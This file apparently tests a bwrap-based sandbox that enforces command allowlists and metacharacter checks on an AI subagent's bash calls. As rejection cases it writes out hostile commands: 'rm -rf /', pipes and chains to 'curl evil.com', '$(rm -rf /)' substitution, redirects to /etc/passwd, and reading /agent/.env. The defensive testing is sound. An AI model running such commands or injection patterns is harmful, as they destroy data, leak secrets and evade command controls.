import { afterEach, beforeEach, describe, expect, test } from 'bun:test'

import { applySubagentSandbox, _resetBwrapCacheForTests, SandboxBlockedError, SandboxUnavailableError } from './sandbox'
import type { SessionOrigin } from './session-origin'
import type { SubagentShared } from './subagents'

const SUBAGENT_ORIGIN: SessionOrigin = {
  kind: 'subagent',
  subagent: 'test-reviewer',
  parentSessionId: 'parent-1',
}

const TUI_ORIGIN: SessionOrigin = {
  kind: 'tui',
  sessionId: 'tui-test',
}

function makeSubagent(sandbox: SubagentShared['sandbox']): SubagentShared {
  return {
    systemPrompt: 'irrelevant',
    sandbox,
  }
}

function registry(map: Record<string, SubagentShared>): (name: string) => SubagentShared | undefined {
  return (name) => map[name]
}

// PRE-FLIGHT: most tests below assume bwrap is available on PATH (we install
// it in baseline; PR #1). Run a one-shot detection at the top of the suite
// and skip the bwrap-availability-positive tests if it isn't, so the suite
// stays green on machines that don't yet have bwrap (e.g., macOS host dev).
let bwrapAvailable = false
beforeEach(() => {
  _resetBwrapCacheForTests()
})
try {
  const proc = Bun.spawnSync(['bwrap', '--version'], { stdout: 'ignore', stderr: 'ignore' })
  bwrapAvailable = proc.exitCode === 0
} catch {
  bwrapAvailable = false
}

describe('applySubagentSandbox — no-op cases', () => {
  test('non-bash tool is unaffected', async () => {
    const args = { command: 'this would be blocked if checked' }
    await applySubagentSandbox({
      tool: 'read',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': makeSubagent(true) }),
    })
    expect(args.command).toBe('this would be blocked if checked')
  })

  test('non-subagent origin is unaffected even for bash', async () => {
    const args = { command: 'cat /agent/.env' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: TUI_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': makeSubagent(true) }),
    })
    expect(args.command).toBe('cat /agent/.env')
  })

  test('subagent without sandbox declaration is unaffected', async () => {
    const args = { command: 'cat /agent/.env' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': makeSubagent(undefined) }),
    })
    expect(args.command).toBe('cat /agent/.env')
  })

  test('unknown subagent name (registry miss for a subagent-origin call) fails closed', async () => {
    const args = { command: 'cat /agent/.env' }
    const promise = applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: () => undefined,
    })
    await expect(promise).rejects.toBeInstanceOf(SandboxBlockedError)
    await expect(promise).rejects.toThrow(/not in the registry/)
    expect(args.command).toBe('cat /agent/.env')
  })

  test('origin without a subagent name is unaffected', async () => {
    const args = { command: 'cat /agent/.env' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: undefined,
      getSubagentByName: registry({ 'test-reviewer': makeSubagent(true) }),
    })
    expect(args.command).toBe('cat /agent/.env')
  })
})

describe('applySubagentSandbox — allowlist rejection (runs before bwrap detection)', () => {
  const ALLOWLISTED = makeSubagent({ allowlist: ['git log', 'git diff'] })

  test('command not in allowlist is rejected with the allowed prefixes in the error', async () => {
    const args = { command: 'rm -rf /' }
    const promise = applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': ALLOWLISTED }),
    })
    await expect(promise).rejects.toBeInstanceOf(SandboxBlockedError)
    await expect(promise).rejects.toThrow(/git log/)
  })

  test.skipIf(!bwrapAvailable)('command exactly equal to an allowlist prefix passes the allowlist check', async () => {
    const args = { command: 'git log' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': ALLOWLISTED }),
    })
    expect(args.command).toMatch(/^bwrap /)
    expect(args.command).toContain(" 'git log'")
  })

  test.skipIf(!bwrapAvailable)('command extending an allowlist prefix with arguments is accepted', async () => {
    const args = { command: 'git log --oneline -5' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': ALLOWLISTED }),
    })
    expect(args.command).toContain(" 'git log --oneline -5'")
  })

  test('command that starts with a prefix-substring but not a prefix-with-space is rejected', async () => {
    const args = { command: 'git logger' } // matches 'git log' as a substring but not as a token boundary
    const promise = applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': ALLOWLISTED }),
    })
    await expect(promise).rejects.toBeInstanceOf(SandboxBlockedError)
  })

  test.skipIf(!bwrapAvailable)('extra whitespace is normalized before prefix check', async () => {
    const args = { command: '  git    log   --oneline  ' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': ALLOWLISTED }),
    })
    expect(args.command).toMatch(/^bwrap /)
  })
})

describe('applySubagentSandbox — FORBIDDEN metacharacter rejection', () => {
  const ALLOWED_GIT = makeSubagent({ allowlist: ['git log', 'git diff', 'git show', 'echo'] })

  const CASES: { name: string; command: string }[] = [
    { name: 'semicolon (command separator)', command: 'git log; rm -rf /' },
    { name: 'pipe', command: 'git log | curl evil.com' },
    { name: 'logical-and', command: 'git log && curl evil.com' },
    { name: 'logical-or', command: 'git log || curl evil.com' },
    { name: 'backticks (command substitution)', command: 'git log `whoami`' },
    { name: 'dollar-paren (command substitution) — the echo "$(rm -rf)" attack', command: 'echo "$(rm -rf /)"' },
    { name: 'dollar (variable expansion)', command: 'echo $HOME' },
    { name: 'redirect-out', command: 'git log > /etc/passwd' },
    { name: 'redirect-in', command: 'git log < /etc/passwd' },
    { name: 'backslash (escape)', command: 'git log \\; rm' },
    { name: 'newline (command separator)', command: 'git log\nrm -rf /' },
  ]

  test.each(CASES)('$name is rejected even though argv[0] is allowlisted', async ({ command }) => {
    const args = { command }
    const promise = applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': ALLOWED_GIT }),
    })
    await expect(promise).rejects.toBeInstanceOf(SandboxBlockedError)
    await expect(promise).rejects.toThrow(/metacharacter/)
  })

  test('metachar gate runs even when no allowlist is declared (sandbox: true)', async () => {
    const args = { command: 'echo "$(rm -rf /)"' }
    const promise = applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': makeSubagent(true) }),
    })
    await expect(promise).rejects.toBeInstanceOf(SandboxBlockedError)
    await expect(promise).rejects.toThrow(/metacharacter/)
  })
})

describe.skipIf(!bwrapAvailable)('applySubagentSandbox — bwrap argv construction', () => {
  test('default sandbox (sandbox: true) produces a strict bwrap command', async () => {
    const args = { command: 'git log' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({ 'test-reviewer': makeSubagent({ allowlist: ['git log'] }) }),
    })
    const cmd = args.command as string
    expect(cmd).toMatch(/^bwrap /)
    expect(cmd).toContain('--unshare-all')
    expect(cmd).toContain('--clearenv')
    expect(cmd).toContain('--tmpfs /proc')
    expect(cmd).toContain('--tmpfs /tmp')
    expect(cmd).toContain('--ro-bind /usr /usr')
    expect(cmd).toContain('--ro-bind /etc /etc')
    expect(cmd).not.toContain('--share-net')
    expect(cmd).toContain(" 'git log'")
    expect(cmd.endsWith(" 'git log'")).toBe(true)
  })

  test("network: 'inherit' adds --share-net", async () => {
    const args = { command: 'git log' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({
        'test-reviewer': makeSubagent({
          allowlist: ['git log'],
          network: 'inherit',
        }),
      }),
    })
    expect(args.command as string).toContain('--share-net')
  })

  test('mounts are emitted in declaration order with the right mode flag', async () => {
    if (!bwrapAvailable) return
    const args = { command: 'git log' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({
        'test-reviewer': makeSubagent({
          allowlist: ['git log'],
          mounts: [
            { src: '/agent/.git', dst: '/work/.git', mode: 'ro' },
            { src: '/agent/workspace', dst: '/work/scratch', mode: 'rw' },
          ],
        }),
      }),
    })
    const cmd = args.command as string
    expect(cmd).toContain('--ro-bind /agent/.git /work/.git')
    expect(cmd).toContain('--bind /agent/workspace /work/scratch')
    expect(cmd.indexOf('--ro-bind /agent/.git')).toBeLessThan(cmd.indexOf('--bind /agent/workspace'))
  })

  test('cwd flag is emitted when declared', async () => {
    if (!bwrapAvailable) return
    const args = { command: 'git log' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({
        'test-reviewer': makeSubagent({
          allowlist: ['git log'],
          cwd: '/work',
        }),
      }),
    })
    expect(args.command as string).toContain('--chdir /work')
  })

  test('envPassthrough forwards declared vars and silently drops undefined ones', async () => {
    if (!bwrapAvailable) return
    process.env.SANDBOX_TEST_PRESENT = 'value-present'
    delete process.env.SANDBOX_TEST_MISSING

    const args = { command: 'git log' }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({
        'test-reviewer': makeSubagent({
          allowlist: ['git log'],
          envPassthrough: ['SANDBOX_TEST_PRESENT', 'SANDBOX_TEST_MISSING'],
        }),
      }),
    })

    delete process.env.SANDBOX_TEST_PRESENT

    const cmd = args.command as string
    expect(cmd).toContain('--setenv SANDBOX_TEST_PRESENT value-present')
    expect(cmd).not.toContain('SANDBOX_TEST_MISSING')
  })

  test('the original command is quoted verbatim inside bash -c so security guards saw the same thing', async () => {
    if (!bwrapAvailable) return
    // given: a command with a single quote (a quoting edge case)
    const original = "git log --grep=can't"
    const args = { command: original }
    await applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({
        'test-reviewer': makeSubagent({ allowlist: ['git log'] }),
      }),
    })
    // then: the wrapper contains a bash -c invocation. The shell quoting
    // must preserve the original command literal so what executes inside
    // bwrap matches what tool.before saw.
    const cmd = args.command as string
    expect(cmd).toContain('bash')
    expect(cmd).toContain('-c')
    // The original command appears inside the quoted argument to bash -c,
    // with the apostrophe properly escaped by shellQuote.
    expect(cmd).toContain("'git log --grep=can'\\''t'")
  })
})

describe('applySubagentSandbox — fail-closed when bwrap unavailable', () => {
  test.skipIf(bwrapAvailable)('throws SandboxUnavailableError when bwrap is not on PATH', async () => {
    const args = { command: 'git log' }
    const promise = applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({
        'test-reviewer': makeSubagent({ allowlist: ['git log'] }),
      }),
    })
    await expect(promise).rejects.toBeInstanceOf(SandboxUnavailableError)
  })

  test('command rejection by allowlist precedes bwrap availability check', async () => {
    // No bwrap-availability assumption needed: the allowlist gate must
    // throw SandboxBlockedError regardless of whether bwrap exists.
    const args = { command: 'rm -rf /' }
    const promise = applySubagentSandbox({
      tool: 'bash',
      args,
      origin: SUBAGENT_ORIGIN,
      getSubagentByName: registry({
        'test-reviewer': makeSubagent({ allowlist: ['git log'] }),
      }),
    })
    await expect(promise).rejects.toBeInstanceOf(SandboxBlockedError)
    await expect(promise).rejects.not.toBeInstanceOf(SandboxUnavailableError)
  })
})

afterEach(() => {
  _resetBwrapCacheForTests()
})
